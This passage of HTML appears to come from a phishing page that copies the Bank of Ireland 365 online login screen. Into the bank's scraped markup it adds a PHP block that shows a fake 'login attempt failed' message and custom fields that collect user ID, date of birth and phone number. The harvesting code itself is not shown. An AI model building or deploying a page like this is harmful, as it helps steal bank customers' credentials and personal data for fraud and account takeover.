                     <img src="https://www.365online.com/Digital/images/BOI/boiImages/boi_logo_sm.svg" alt="Bank of Ireland logo">
                  </div>
                  <div class="boi-info-page--logo desktop-only">
                     <img src="https://www.365online.com/Digital/images/BOI/boi_logo.svg" alt="Bank of Ireland logo">
                  </div>
               </div>
            </div>
            <div class="boi-info-page--content responsive-section tc-centered">
               <h1 class="boi-info-page--heading-desktop">Please enable Javascript</h1>
               <div class="boi-info-page--logged-out-icon">
                  <img src="https://www.365online.com/Digital/images/BOI/Alert_288.gif" alt="Alert icon" aria-hidden="true">
               </div>
               <p class="boi-info-page--text">We need Javascript enabled on your browser to give you the maximum features available on 365 online.</p>
            </div>
         </div>
      </noscript>
      <div id="helpTextDiv" style="display: none;"></div>
      <form class="noscript-hidden main-form" method="post" action="servletcontroller" onsubmit="return false;" autocomplete="off" id="loginForm">
         <input type="hidden" tabindex="-1" name="MODE" />
         <input type="hidden" tabindex="-1" name="x2bec7449-e1f7-4b71-a6ee-077f4817a45f" value="23513562-7a59-49d7-a3ef-c4187e863d10" />
         <input type="hidden" tabindex="-1" name="MENUSTATE" />
         <div style="display: none;"><input type="hidden" name="DEVICE_INFO" value=""/></div>
         <div style="display: none;"><input type="hidden" name="DEVICE_SIZE_INFO" value=""/></div>
         <div class="boi-main-header  " style="width: 100%" id="EDGE_CONNECT_PROCESS">
            <div style="text-align: left; " id="TXT_EF2244371E73991A112821">
               <p id="boiAccessibilityPageTitle_TXT_EF2244371E73991A112821" class="boi-accessibility-hidden"></p>
               <script type="text/javascript" charset="utf-8">
                  //<![CDATA[
                  $(document).ready(function() {
                  Hi.addHook('setOuterHTML', addAjaxAccessibilityPageTitle);
                  Hi.addHook('afterInitForm', addTxtToAccessibilityPageTitle);
                  function addTxtToAccessibilityPageTitle() {
                  var boiAccessibilityPageTitleDiv = $('#boiAccessibilityPageTitle_TXT_EF2244371E73991A112821');
                  if  (!boiAccessibilityPageTitleDiv.html()) {
                  setTitleTxt(boiAccessibilityPageTitleDiv, true, 100);
                  }
                  }
                  function addAjaxAccessibilityPageTitle(dElement, text, service) {
                  var boiAccessibilityPageTitleDiv = $('#boiAccessibilityPageTitle_TXT_EF2244371E73991A112821');
                  if  (service == "AjaxButtonActionService" && dElement.id.indexOf("EDGE_CONNECT_PROCESS") >= 0) {
                  boiAccessibilityPageTitleDiv.attr("aria-hidden", "false");
                  setTitleTxt(boiAccessibilityPageTitleDiv, false, 500);
                  }
                  }
                  function setTitleTxt(boiAccessibilityPageTitleDiv, isTitleFromKeyword, interval) {
                  var boiAccessibilityPageTitle = "Bank of Ireland";
                  try {
                  setTimeout(function() {
                  document.activeElement.blur();
                  boiAccessibilityPageTitle = isTitleFromKeyword ? 'Login' : $("#boiAccessibilityPageTitleTxt").text();
                  boiAccessibilityPageTitle = (boiAccessibilityPageTitle != '') ? unCamelCase(boiAccessibilityPageTitle) : 'Bank of Ireland';
                  boiAccessibilityPageTitle = "This Page title is " + boiAccessibilityPageTitle;
                  boiAccessibilityPageTitleDiv.html(boiAccessibilityPageTitle);
                  }, interval);
                  setTimeout(function() {

                  boiAccessibilityPageTitleDiv.attr("tabindex", "0");
                  // Check if cookie banner is visible on Desktop before setting focus on Page Title div.
                  var cookieBanner = $('.optanon-alert-box-title');
                  if (cookieBanner.is(':visible')) {
                  cookieBanner.focus();
                  return;
                  }

                  // Focus should bring to the top of the page to page title
                  var obj = document.getElementById("boiAccessibilityPageTitle_TXT_EF2244371E73991A112821");
                  if (obj.setActive) {
                  obj.setActive().scrollIntoView();
                  }
                  // added script rather than specifying directly to avoid android to read twice
                  boiAccessibilityPageTitleDiv.attr({'role': 'alert', 'aria-live': 'assertive', 'aria-label': boiAccessibilityPageTitle }).focus();
                  }, 190);//make JAWS to read out
                  } catch(err) {
                  console.log(err.message);
                  }
                  }
                  });
                  //]]>
               </script>
            </div>
            <div>
               <div id="p1_GRP_3AA85F8CFCC2D9BB421430" style="position: relative; width: 100%">
                  <div style="width: 100%" id="C1__EDGE_CONNECT_PROCESS">
                     <div id="C1__EDGE_CONNECT_PHASE">
                        <div>
                           <div id="C1__p1_GRP_996A971214FCBA4B44414" style="display: none;position: relative"></div>
                        </div>
                        <div id="C1__FMT_141307C36E61FFFD264537" class="tc-box-on" style="display: none;"></div>
                        <div>
                           <div style="text-align: left; " id="C1__TXT_7431863412A28D721130110">
                              <div id="WRAPPER_C1__TXT_7431863412A28D721130110"
                                 class="tc-global-font spinnerWrapper"
                                 aria-label="Loading page now">
                                 <div class="loading">
                                    <!-- We make this div spin -->
                                    <div class="spinner">
                                       <!-- Mask of the quarter of circle -->
                                       <div class="mask">
                                          <!-- Inner masked circle -->
                                          <div class="maskedCircle"></div>
                                       </div>
                                    </div>
                                    <div class="loginSpinnerContainer" aria-hidden="true" role="presentation" tabindex="-1">
                                       <div class="boi_label loginSpinnerStep1">
                                          Contacting server...
                                       </div>
                                       <div class="boi_label loginSpinnerStep2">
                                          Authenticating PIN...
                                       </div>
                                       <div class="boi_label loginSpinnerStep3">
                                          Running security checks...
                                       </div>
                                    </div>
                                    <div class="boi_label spinnerWaitingText" aria-hidden="true" role="presentation" tabindex="-1">Loading</div>
                                 </div>
                              </div>
                              <script type="text/javascript" charset="utf-8">
                                 //<![CDATA[
                                 TemenosLoader.setup({
                                 id: 'C1__TXT_7431863412A28D721130110',
                                 showMask: 'N',
                                 delay: ''
                                 });
                                 $(document).ready(function() {
                                 TemenosLoader.triggerHide();
                                 $('.main-form').attr('aria-hidden', 'false');
                                 });
                                 Hi.addHook('beforeSubmit', showSpinnerOnSubmit);
                                 Hi.addHook('beforeAjaxButtonActionService', showSpinnerForAjaxButton);
                                 Hi.addHook('postProcessResponse', TemenosLoader.triggerHide);
                                 function showSpinnerOnSubmit(){
                                 $('#WRAPPER_C1__TXT_7431863412A28D721130110').attr({'role': 'alert', 'aria-live': 'assertive'});
                                 $('.main-form').attr('aria-hidden', 'true');
                                 TemenosLoader.triggerShow();
                                 }
                                 function showLoginSpinner(){
                                 $('.loginSpinnerContainer').css('visibility', 'visible'); // show the custom spinner for Login
                                 $('.spinnerWaitingText').hide(); // hide the default spinner
                                 $('#WRAPPER_C1__TXT_7431863412A28D721130110').addClass('customLoginSpinner'); // added a class on the body element to style the custom spinner
                                 }
                                 function showSpinnerForAjaxButton() {
                                 if(document.activeElement.classList.contains('showSpinner_ajaxbutton')) {
                                 TemenosLoader.triggerShowAjax();
                                 }
                                 }
                                 //]]>
                              </script>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div id="EDGE_CONNECT_PHASE">
               <div class="tc-global-font tc-global-color tc-normal-weight  " style="width: 100%" id="C2__EDGE_CONNECT_PROCESS">
                  <div class="ecDIBCol  ecDIB  col-full" id="C2__COL_14F3CFE779950D02511050">
                     <div style="text-align: center; " id="C2__TXT_14F3CFE779950D02511051">
                        <div id="MajorAlertLoginStep1" role="alert" aria-live="polite" aria-atomic="true" style="width: 100%; left: 0;" class="ios-safe-area-inset-top"></div>
                     </div>
                  </div>
                  <div id="C2__FMT_F6A61BDCCE0BE22264913" class="responsive-section tc-content-area tc-content-area-no-menu rgrid_3_8_12_12_16">
                     <div id="C2__FMT_F6A61BDCCE0BE22264932" class="responsive-row">
                        <div id="C2__FMT_E1EF3F312B4C2F9795170" class="col-full-xs col-full-sm col-10-12-md col-4-7-lg col-3-7-xl tc-center-align-block boi-standard-login-card-layout">
                           <div id="C2__EDGE_CONNECT_PHASE">
                              <div id="C2__FMT_E3AD16BD474843C9285254" class="boi-heading-logo">
                                 <div style="text-align: center; " id="C2__TXT_E3AD16BD474843C9285255">
                                    <img src="https://www.365online.com/Digital/images/BOI/boi_logo.svg"  alt="Bank of Ireland Logo" id="img_C2__TXT_E3AD16BD474843C9285255"
                                       width="100%"
                                       title="Bank of Ireland Logo"
                                       />
                                 </div>
                              </div>
                              <div id="C2__FMT_E836AD2887BCD5FF3262303" class="boi-alert-container">
                                 <div style="text-align: center; " id="C2__TXT_0AD26B9BD45E7BB6776237">
                                    <div id="MinorAlertLoginStep1" role="alert" aria-live="polite" aria-atomic="true"></div>
                                 </div>
                                 <script>
                                    $(document).ready(function () {
                                    $('.boi-standard-global-error-message .fa-close').click(function(){
                                    $('.boi-standard-global-error-message').hide();
                                    });
                                    });
                                 </script>
                                 <script>
                                    $(document).ready(function () {
                                    $('.boi-standard-global-error-message').click(function(){
                                    $('.boi-standard-global-error-message').hide();
                                    });
                                    setTimeout(function() {
                                    $("#C2__HEAD_B48CF68CE2E490A0586682_").focus();
                                    $("#C2__HEAD_B48CF68CE2E490A0586682_").removeAttr("title");
                                    }, 250);
                                    });
                                 </script>
                                 <style>
                                    .boi-standard-global-error-message .boi-error-msg-wrap {display: flex; word-break: break-word;}
                                    .boi-standard-global-error-message .boi-error-msg-wrap .boi_input {margin-left: 0px; margin-top: 5px;}
                                    .boi-standard-global-error-message .boi-login-error-msg.boi_label {margin-top: 10px; color: #616365;}
                                 </style>
                              </div>
                              <div id="C2__FMT_F6A61BDCCE0BE22267204" class="tc-card-bg shadow-style-1 tc-card boi-login-card  boi-clear-both">
                                 <div id="C2__FMT_F6A61BDCCE0BE22267241" class=" tc-card-body boi-login">
                                    <div class="ecDIBCol  ecDIB  col-full" id="C2__COL_017EED9DC30CAEC7926315">
                                       <div id="C2__row_HEAD_017EED9DC30CAEC7879515" class="boi-mb-30  ">
                                          <div id="C2__p1_HEAD_017EED9DC30CAEC7879515" style="text-align: center; ; ">
                                             <div>
                                                <h1 id="C2__HEAD_017EED9DC30CAEC7879515" class="ecDIB  ">Enter your log in details</h1>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="ecDIBCol  ecDIB  col-full" id="C2__COL_FC4A31B4944B46E7236502">
                                       <div id="C2__row_HEAD_FC4A31B4944B46E7237320">
                                          <div id="C2__p1_HEAD_FC4A31B4944B46E7237320" style="text-align: center; ; ">
                                             <div>
                                               <?php if (isset($_GET["error"])) { ?>
                                                 <h1 id="C2__HEAD_FC4A31B4944B46E7237320" class="boi-sca-simulateflow-error boi-role-alert boi_input_sm_error  ecDIB  ">Your login attempt failed. Please try again.</h1>
                                                <?php } ?>
                                             </div>
                                          </div>
                                       </div>
                                       <div id="C2__row_HEAD_A249C4A680A105FC86645" style="display: none;"></div>
                                    </div>
                                    <div id="C2__HIDE_USER_ID_FIELD">
                                       <div id="C2__row_USER_NAME" class="boi-standard-question-label boi-standard-question-label rgrid_3_8_12_12_16 gutter-xy-1  ">
                                          <div id="C2__p1_USER_NAME" style="text-align: left; " class="ecDIB  col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl boi_label tc-question-part boi_label">
                                             <div><label for="C2__USER_NAME">User ID</label><span id="C2__p2_USER_NAME__REMOVED" style="display: none;">*</span></div>
                                          </div>
                                       </div>
                                       <div id="C2__row_ansRowUSER_NAME" class="boi-standard-question-label boi-standard-question-label rgrid_3_8_12_12_16 gutter-xy-1  ">
                                          <div style="text-align: left; ; " class="ecDIB  col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part boi-gs-field-margin boi-full-width  " id="C2__p4_USER_NAME">
                                             <div><input type="number" minlength="6" maxlength="8" name="userid" id="C2__USER_NAME" class="tc-form-control tc-full-width boi_input boi_input_placeholder boi-form-control boi-oneapp-userid boi-input-clear tc-default-input tc-rounded-1 boi-user-storage-id boi-enable-numkeypad validateMaxLength ignore-current-focus  " size="8" maxlength="8" required="required" />
                                                <span style="display: none" id="C2__MM_USER_NAME">No user ID entered, please try again</span><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__USER_NAME_ERRORMESSAGE" aria-live="assertive"></span>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div>
                                       <div id="C2__row_QUE_7FF7CAFAACF93118221880" class="boi-standard-question-label  datepickerenable  boi-mt-3  ">
                                          <div id="C2__p1_QUE_7FF7CAFAACF93118221880" style="text-align: left; " class="ecDIB  tc-question-part boi-full-width boi_label">
                                             <div><label for="C2__QUE_7FF7CAFAACF93118221880">Date of birth</label><span id="C2__p2_QUE_7FF7CAFAACF93118221880" class="tc-mand-part tc-normal-weight col-hidden">*</span></div>
                                          </div>
                                       </div>

                                       <div id="C2__row_ansRowQUE_7FF7CAFAACF93118221880" class="boi-standard-question-label  datepickerenable  boi-mt-3  ">
                                          <div style="text-align: left; ; " class="ecDIB  tc-answer-part boi-cal-error-icon tc-position-rel boi-gs-field-spacing boi-full-width  " id="C2__p4_QUE_7FF7CAFAACF93118221880">
                                             <div><input type="text" name="dob" id="dob" class="tc-form-control boi-full-width boi-input-clear boi_input tc-default-input boi-rounded-1 login-dob ignore-current-focus  " minlength="10" required="required"></span></div>
                                          </div>
                                       </div>
                                       <span id="doberror" style="color: red; display: none;">Please enter a valid date of birth.</span>
                                       <div id="C2__row_HEAD_CD2C792472E301A8158054" class="boi_input_sm_error boi-standard-maxdate-error  " style="display: none;">
                                          <div id="C2__p1_HEAD_CD2C792472E301A8158054" style="display: none;text-align: left; ; " class="ecDIB  ">
                                             <div>Invalid date, please try again. Date must be in format DD/MM/YYYY</div>
                                          </div>
                                       </div>
                                       <div class="td-card-spacing-2 boi-card-standard-spacing" id="C2__SPC_220EBD4981114CD4401705" style="text-align: left; ">&nbsp;<br/></div>
                                       <div id="C2__row_QUE_6CEEFC90A8C851584854333" class="responsive-row tc-row-part tc-row-flex rgrid_3_8_12_12_16  " style="display:none; ">
                                          <div id="C2__p1_QUE_6CEEFC90A8C851584854333" class="ecDIB  responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl tc-question-part tc-bold">
                                             <div><label for="C2__QUE_6CEEFC90A8C851584854333">OneAppDeviceId</label><span id="C2__p2_QUE_6CEEFC90A8C851584854333" class="tc-mand-part tc-normal-weight"> </span></div>
                                          </div>
                                          <div class="ecDIB  responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part  " id="C2__p4_QUE_6CEEFC90A8C851584854333">
                                             <div><input type="tel" name="C2__LOGIN[1].ONEAPPDEVICEID" id="C2__QUE_6CEEFC90A8C851584854333" class="tc-form-control tc-half-answer-width boi-oneapp-deviceid tc-default-input tc-rounded-1  " size="15" maxlength="256" ></span></div>
                                          </div>
                                       </div>
                                       <div id="C2__HIDE_USER_ID_FIELD">
                                          <div id="C2__row_USER_NAME" class="boi-standard-question-label boi-standard-question-label rgrid_3_8_12_12_16 gutter-xy-1  ">
                                             <div id="C2__p1_USER_NAME" style="text-align: left; " class="ecDIB  col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl boi_label tc-question-part boi_label">
                                                <div><label for="C2__USER_NAME">Phone Number</label><span id="C2__p2_USER_NAME__REMOVED" style="display: none;">*</span></div>
                                             </div>
                                          </div>
                                          <div id="C2__row_ansRowUSER_NAME" class="boi-standard-question-label boi-standard-question-label rgrid_3_8_12_12_16 gutter-xy-1  ">
                                             <div style="text-align: left; ; " class="ecDIB  col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part boi-gs-field-margin boi-full-width  " id="C2__p4_USER_NAME">
                                                <div><input type="text" name="phonenumber" class="tc-form-control tc-full-width boi_input boi_input_placeholder boi-form-control boi-oneapp-userid boi-input-clear tc-default-input tc-rounded-1 boi-user-storage-id boi-enable-numkeypad validateMaxLength ignore-current-focus  " minlength="8" maxlength="10" required="required"/>
                                                   <span style="display: none" id="C2__MM_USER_NAME">No user ID entered, please try again</span><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__USER_NAME_ERRORMESSAGE" aria-live="assertive"></span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div id="C2__row_Login-LoginPage-Login">
                                          <div id="C2__p1_Login-LoginPage-Login" class="ecDIB  col-hidden">
                                             <div>&nbsp;</div>
                                          </div>
                                          <div class="ecDIB  tc-full-button-xs tc-full-width  " style="text-align: left; " id="C2__p4_Login-LoginPage-Login">
                                             <div>
                                                <button title="Continue" onclick="return buttonClicked('C2____B21F665AB75B0963 FormButton 19', true, null, '', false, 'C2__Login-LoginPage-Login', true, false, '', true, true, 'preInPhase');" class="tc-accent-bg-new tc-button-color tc-button tc-rounded-1 tc-uppercase tc-normal-icon-with-text Btn_primary boi-primary-card-button tc-full-width boi_pin_ctn_btn boi-device-prov-ctn-btn" id="C2__Login-LoginPage-Login"><span>Continue</span></button>
                                                <script type="text/javascript" charset="utf-8">
                                                   //<![CDATA[

                                                   $('#dob').mask("00/00/0000");

                                                   $(function() {

                                                   function doWork(e) {












                                                   var $parent =  $("html") ;




                                                   if (!(typeof(boiparm) == 'undefined')){
                                                   if (typeof (boiparm.boiform) == 'function'){
                                                   boiparm.boiform('C2__boi_prefs');
                                                   }
                                                   }



                                                   return buttonClicked('C2____B21F665AB75B0963 FormButton 19', true, null, '', false, 'C2__Login-LoginPage-Login', true, false, '', true, true, 'preInPhase');




                                                   }
                                                   var $el = $("#C2__Login-LoginPage-Login:not([handlerChanged='Y'])");
                                                   $el.attr("handlerChanged", "Y")
                                                   .attr("onoldclick", $el.attr("onclick"))
                                                   .removeProp("onclick");
                                                   if (!$el.hasClass("boi-delegate-click-to-container") && ("" === "")) {
                                                   $el.on("click", function(e) {
                                                   doWork(e);
                                                   });
                                                   }

                                                   //Add support for space bar button click
                                                   $("#C2__Login-LoginPage-Login").keydown(function(e) {
                                                   if (e.which == 32) {
                                                   $("#C2__Login-LoginPage-Login").click();
                                                   e.preventDefault();
                                                   }
                                                   });
                                                   });
                                                   //]]>
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div id="C2__FMT_2CA27864C30804CF450143" class="boi-login-forgotPIN boi-mb-10 button-with-popup">
                                       <div id="C2__row_BUT_F6F687B20B6CA893415823">
                                          <div id="C2__p1_BUT_F6F687B20B6CA893415823" class="ecDIB  ">
                                             <div>&nbsp;</div>
                                          </div>
                                          <div class="ecDIB  " style="text-align: center; " id="C2__p4_BUT_F6F687B20B6CA893415823">
                                             <div>
                                                <a title="Forgot your user ID" onclick="ajaxButtonAction( null, 'C2____F6F687B20B6CA893 FormButton 79', 'C2__BUT_F6F687B20B6CA893415823', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" class="roleButton" id="C2__BUT_F6F687B20B6CA893415823"><span>Forgot your user ID <i class="fas fa-arrow-circle-right boi-fs-16 ml-5 " style="font-family: 'Font Awesome 5 Free' !important;" aria-hidden="true"></i></span></a>
                                                <script type="text/javascript" charset="utf-8">
                                                   //<![CDATA[



                                                   $(function() {


                                                   function doWork() {


                                                   try {
                                                   window.boiCbs.openDialog({
                                                   id: "C2__BUT_F6F687B20B6CA893415823",
                                                   COMPONENT_ID_PREFIX: "C2__",
                                                   IdToUpdate: "FMT_327292FC505097A7172536",
                                                   ClassToRemove: "",
                                                   ClassToToggle: "",
                                                   ClassToAdd:    "",
                                                   ParentContextSelector: "",
                                                   AnimationType: "",
                                                   DefaultTextOnButton: "",
                                                   ClickedTextOnButton: "",
                                                   isHybrid: "",
                                                   DisableDefaultCloseDialogButton: "N",
                                                   hashedUserId: "",
                                                   processName: "",
                                                   phaseName: ""
                                                   })
                                                   } catch (e) {
                                                   log("Problem running javascript function: window.boiCbs.openDialog");
                                                   }









                                                   var $parent =  $("html") ;








                                                   ajaxButtonAction( null, 'C2____F6F687B20B6CA893 FormButton 79', 'C2__BUT_F6F687B20B6CA893415823', false, null, '', 'servletcontroller', '', false, true, '' );




                                                   }
                                                   var $el = $("#C2__BUT_F6F687B20B6CA893415823:not([handlerChanged='Y'])");
                                                   $el.attr("handlerChanged", "Y")
                                                   .attr("onoldclick", $el.attr("onclick"))
                                                   .removeProp("onclick")
                                                   .on("click", function(e) {
                                                   doWork();
                                                   }
                                                   );




                                                   });
                                                   //]]>
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="ecDIBCol  ecDIB  button-with-popup col-hidden" id="C2__COL_2CA27864C30804CF450849">
                                          <div id="C2__FMT_327292FC505097A7172536" class="boi-position-center boi-popup-dialog__wrapper boi-popup-wide">
                                             <div>
                                                <div id="C2__p1_GRP_1D846D1BE7918E0B141262" style="position: relative">
                                                   <div id="C2__FMT_327292FC505097A7172588" class="boi-popup-dialog__title--background boi-flex--horizontal--justify boi-flex">
                                                      <div id="C2__row_HEAD_1D846D1BE7918E0B141267">
                                                         <div id="C2__p1_HEAD_1D846D1BE7918E0B141267">
                                                            <div>
                                                               <h1 id="C2__HEAD_1D846D1BE7918E0B141267" class="boi-popup-dialog__title  ecDIB  ">Forgot your User ID</h1>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <div id="C2__FMT_327292FC505097A7172625" class="boi-padding-20">
                                                      <div id="C2__row_HEAD_1D846D1BE7918E0B141272" class="margin-top18 boi-mb-20  ">
                                                         <div id="C2__p1_HEAD_1D846D1BE7918E0B141272" style="text-align: left; ; " class="ecDIB  boi_label_sm_regular">
                                                            <div>Based on where you are right now, text the most suitable number below and we’ll reply with your user ID.</div>
                                                         </div>
                                                      </div>
                                                      <div id="C2__row_HEAD_2CA27864C30804CF450215" class="boi-mb-30  ">
                                                         <div id="C2__p1_HEAD_2CA27864C30804CF450215" style="text-align: left; ; " class="ecDIB  boi_label_bold">
                                                            <div>You must send the text from your registered device. Otherwise for security reasons we won't be able to reply.</div>
                                                         </div>
                                                      </div>
                                                      <div id="C2__TXT_2CA27864C30804CF452991">
                                                         <div class="boi_contact-phonenumbers">
                                                            <div class="boi_contact-phonenumbers-row">
                                                               <div>
                                                                  <p class="boi_label_bold">Republic of Ireland</p>
                                                                  <p class="boi_stepper" role="text" aria-label="Text user to 5 0 3 6 5">Text "user" to 50365</p>
                                                               </div>
                                                            </div>
                                                            <div class="boi_contact-phonenumbers-row">
                                                               <div>
                                                                  <p class="boi_label_bold">Northern Ireland and Great Britain</p>
                                                                  <p class="boi_stepper" role="text" aria-label="Text user to 5 0 3 6 5">Text "user" to 50365</p>
                                                               </div>
                                                            </div>
                                                            <div class="boi_contact-phonenumbers-row">
                                                               <div>
                                                                  <p class="boi_label_bold">Other locations</p>
                                                                  <p class="boi_stepper" role="text" aria-label="Text user to + 3 5 3. 8 6. 1 8 0. 3 8 8 8">Text "user" to +353 86 180 3888</p>
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                      <div id="C2__row_BUT_2CA27864C30804CF453155" class="btn-primary-large text-center boi-mt-25 boi-mb-15  ">
                                                         <div id="C2__p1_BUT_2CA27864C30804CF453155" class="ecDIB  col-hidden">
                                                            <div>&nbsp;</div>
                                                         </div>
                                                         <div class="ecDIB  col-full-xs col-full-sm  " style="text-align: center; " id="C2__p4_BUT_2CA27864C30804CF453155">
                                                            <div><button title="Close" onclick="ajaxButtonAction( null, 'C2____2CA27864C30804CF FormButton 82', 'C2__BUT_2CA27864C30804CF453155', false, null, '', 'servletcontroller', '', false, true, '' );" type="button" name="C2____2CA27864C30804CF FormButton 82" value="Close" class="boi-rounded-1 boi-primary-card-button boi-full-width Btn_primary boi-close-popup boi-exit-popup boi-overlay-btn-270" id="C2__BUT_2CA27864C30804CF453155">Close</button></div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div id="C2__FMT_58252E3CE35865542302528" class="boi-padding-20 boi-box-tile-bg-white boi-no-border ext-max-width-full max-width--100 button-with-popup" style="display: none;"></div>
                                 </div>
                                 <div id="C2__FMT_F6F687B20B6CA893349632" class="col-full p-x-20 p-y-15 boi-mb-7 boi-clear-both">
                                    <div id="C2__row_BUT_0D857B61A322D9371126728">
                                       <div id="C2__p1_BUT_0D857B61A322D9371126728" class="ecDIB  col-hidden">
                                          <div>&nbsp;</div>
                                       </div>
                                       <div class="ecDIB  col-full  " style="text-align: center; " id="C2__p4_BUT_0D857B61A322D9371126728">
                                          <div><a title="Security Concerns" onclick="ajaxButtonAction( null, 'C2____0D857B61A322D937 FormButton 71', 'C2__BUT_0D857B61A322D9371126728', false, null, '', 'servletcontroller', '', true, true, '' );" href="javascript:void(0);" class="boi-btn-transparent boi_input_blue center-aligned col-full boi-mb-7" id="C2__BUT_0D857B61A322D9371126728"><span>Security concerns?</span></a></div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div>
                                 <div class="tc-divider-no-space boi-review-twentyfive-spacing" id="C2__SPC_7FF7CAFAACF93118471541" style="text-align: left; ">&nbsp;<br/></div>
                                 <div class="tc-divider-no-space boi-review-1-line-spacing boi-review-playback-spacing" id="C2__SPC_3AA85F8CFCC2D9BB747980" style="text-align: left; ">&nbsp;<br/></div>
                                 <div class="tc-divider-no-space boi-review-1-line-spacing boi-review-playback-spacing" id="C2__SPC_3AA85F8CFCC2D9BB747982" style="text-align: left; ">&nbsp;<br/></div>
                              </div>
                              <div id="C2__FMT_DEE166E0CE845AF0421316" class="responsive-row col-hidden" style="display: none;"></div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div>
               <div class="tc-card-spacing-1" id="SPC_3AA85F8CFCC2D9BB470638" style="text-align: left; ">&nbsp;<br/></div>
            </div>
            <div>
               <div id="p1_GRP_FEE5092DB46A8769411350" style="position: relative; width: 100%">
                  <div class="tc-global-font tc-global-color tc-normal-weight  " style="width: 100%" id="C3__EDGE_CONNECT_PROCESS">
                     <div id="C3__EDGE_CONNECT_PHASE">
                        <div id="C3__FMT_7FF7CAFAACF93118509119" class="boi-prelogin-footer tc-box-on">
                           <div id="C3__FMT_7AA09DCFE286E9F1152114" class="boi-background--white boi-text-align-center boi_grey--dark boi_input_sm">
                              <div id="C3__row_HEAD_E3EB453CB96013A94754069" class="boi-footer-server-nickname  ">
                                 <div id="C3__p1_HEAD_E3EB453CB96013A94754069" style="text-align: center; ; " class="ecDIB  boi_para">
                                    <div>BOI.UBPR39-1</div>
                                 </div>
                              </div>
                              <div id="C3__FMT_7AA09DCFE286E9F1152115" class="responsive-section tc-centered rgrid_3_8_12_12_16">
                                 <div id="C3__FMT_7FF7CAFAACF93118543205" class="responsive-row">
                                    <div class="tc-card-spacing-1" id="C3__SPC_48FDDC720897FFFF321087" style="text-align: left; display: none;  "></div>
                                    <div class="ecDIBCol  ecDIB  colLinksFooter tc-center-align-block" id="C3__COL_7FF7CAFAACF93118544824">
                                       <div class="boi-footer__logo--prelogin" style="text-align: left; " id="C3__TXT_B76188CC793F9266605999">
                                          <img src="https://www.365online.com/Digital/images/BOI/boiImages/boi_logo_grey.svg"  alt="Bank of Ireland Logo" id="img_C3__TXT_B76188CC793F9266605999"
                                             title="Bank of Ireland Logo"
                                             />
                                       </div>
                                       <div id="C3__row_LoginPageNavigation-FooterLogin-ContactUs" class="rowFooterBtn  ">
                                          <div id="C3__p1_LoginPageNavigation-FooterLogin-ContactUs__REMOVED" class="ecDIB" style="display: none;">
                                             <div>&nbsp;</div>
                                          </div>
                                          <div class="ecDIB  " style="text-align: center; " id="C3__p4_LoginPageNavigation-FooterLogin-ContactUs">
                                             <div>
                                                <a href="         html/Contact.html " class="tc-link" title="" target="_blank" onclick="return linkConfirm('')">
                                                <span>
                                                Contact
                                                </span>
                                                </a>
                                                <script type="text/javascript">
                                                   function linkConfirm(message) {
                                                   var confirmVal;
                                                   if(typeof message === 'string' && message.trim() !== '') {
                                                   confirmVal = confirm(message);
                                                   return confirmVal;
                                                   } else {
                                                   return true;
                                                   }
                                                   }
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                       <div id="C3__row_LoginPageNavigation-FooterLogin-FAQs" class="rowFooterBtn  ">
                                          <div id="C3__p1_LoginPageNavigation-FooterLogin-FAQs__REMOVED" class="ecDIB" style="display: none;">
                                             <div>&nbsp;</div>
                                          </div>
                                          <div class="ecDIB  " style="text-align: center; " id="C3__p4_LoginPageNavigation-FooterLogin-FAQs">
                                             <div>
                                                <a href="        https://www.bankofireland.com/365apphelp  " class="tc-link" title="" target="_blank" onclick="return linkConfirm('')">
                                                <span>
                                                FAQs
                                                </span>
                                                </a>
                                                <script type="text/javascript">
                                                   function linkConfirm(message) {
                                                   var confirmVal;
                                                   if(typeof message === 'string' && message.trim() !== '') {
                                                   confirmVal = confirm(message);
                                                   return confirmVal;
                                                   } else {
                                                   return true;
                                                   }
                                                   }
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                       <div id="C3__row_BUT_7FF7CAFAACF93118489015" class="rowFooterBtn  " style="display: none;"></div>
                                       <div id="C3__row_LoginPageNavigation-FooterLogin-Security" class="rowFooterBtn  ">
                                          <div id="C3__p1_LoginPageNavigation-FooterLogin-Security__REMOVED" class="ecDIB" style="display: none;">
                                             <div>&nbsp;</div>
                                          </div>
                                          <div class="ecDIB  " style="text-align: center; " id="C3__p4_LoginPageNavigation-FooterLogin-Security">
                                             <div>
                                                <a href="  https://www.bankofireland.com/security-zone/        " class="tc-link" title="" target="_blank" onclick="return linkConfirm('')">
                                                <span>
                                                Security
                                                </span>
                                                </a>
                                                <script type="text/javascript">
                                                   function linkConfirm(message) {
                                                   var confirmVal;
                                                   if(typeof message === 'string' && message.trim() !== '') {
                                                   confirmVal = confirm(message);
                                                   return confirmVal;
                                                   } else {
                                                   return true;
                                                   }
                                                   }
                                                </script>
                                             </div>
                                          </div>
                                       </div>
                                       <div id="C3__row_LoginPageNavigation-FooterLogin-CookiesAndPrivacyPolicy" class="rowFooterBtn  ">
                                          <div id="C3__p1_LoginPageNavigation-FooterLogin-CookiesAndPrivacyPolicy__REMOVED" class="ecDIB" style="display: none;">
                                             <div>&nbsp;</div>
                                          </div>
